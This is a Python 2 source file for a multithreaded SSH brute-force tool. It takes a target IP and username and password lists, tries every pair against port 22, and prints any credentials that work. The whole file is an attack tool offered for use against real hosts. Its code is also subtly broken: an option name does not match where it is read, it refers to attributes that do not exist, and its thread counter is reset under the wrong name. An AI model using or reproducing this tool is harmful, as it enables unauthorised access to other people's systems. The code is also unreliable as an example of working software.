'''
Created on Aug 25, 2011

@author: wildicv
'''

import sys
from optparse import OptionParser

#Import the Util Class
import Util
#Import the connection class
from Connection import Connection

class SSHBruteForce():

    def __init__(self):
        self.info = "Simple SSH Brute Forcer: By Wildicv"
        self.targetIp = ""
        self.userNames = []
        self.passwords = []
        self.connections  = []
        self.amountOfThreads = 10
        self.currentThreadCount = 0
        self.verbose = False
        
    def startUp(self):
        usage = '%s [-h targetIp] [-U UserNameList] [-P PasswordList] [-v]' % sys.argv[0]
        
        optionParser = OptionParser(version = self.info, usage = usage)

        optionParser.add_option('-h', dest = 'targetIp',     help = 'Host To Attack')
        optionParser.add_option('-U', dest = 'userList',     help = 'Username List file')
        optionParser.add_option('-P', dest = 'passwordList', help = 'Password List file')
        optionParser.add_option('-v', '--verbose', action='store_true', dest='verbose', help='verbose')

        (options, args) = optionParser.parse_args()

        if not options.targetIp or not options.userList or not options.passwordlist:
            optionParser.print_help()
            sys.exit(1)
            
        self.targetIp = options.targetIp
        self.userNames = Util.fileContentsToList(options.userList)
        self.passwords = Util.fileContentsToList(options.passwordlist)
        self.verbose = options.verbose
        
        self.showStartInfo()
        self.bruteForceSingle()
        
    def showStartInfo(self):
        print "[*] %s " % self.info
        print "[*] Brute Forcing %s"     % self.targetIp
        print "[*] Loaded %s Usernames"  % str(len(self.userNameList))
        print "[*] Loaded %s Passwords"  % str(len(self.passwordList))
        print "[*] Brute Force Starting"

    def bruteForceSingle(self):
        for userName in self.userNames:
            for password in self.passwords:
                self.createConnection(userName, password, self.targetIp)
            if self.currentThreadCount == self.amountOfThreads:
                self.currentThreadResults()
            
    def createConnection(self, userName, password, targetIp):
        connection = Connection(userName, password, targetIp, 22, 30)
        connection.start()
        self.connections.append(connection)
        self.currentThreadCount += 1
        
    def currentThreadResults(self):
        for connection in self.connections:
            connection.join()
            if connection.status == 'Succeeded':
                print "[#] TargetIp: %s " % connection.targetIp
                print "[#] Username: %s " % connection.userName
                print "[#] Password: %s " % connection.password
            else:
                pass
    
        self.clearOldThreads()
        
    def clearOldThreads(self):
        self.connections = []
        self.threadCount = 0
                
    def completed(self):
        print "[*] Completed Brute Force."
        sys.exit(0)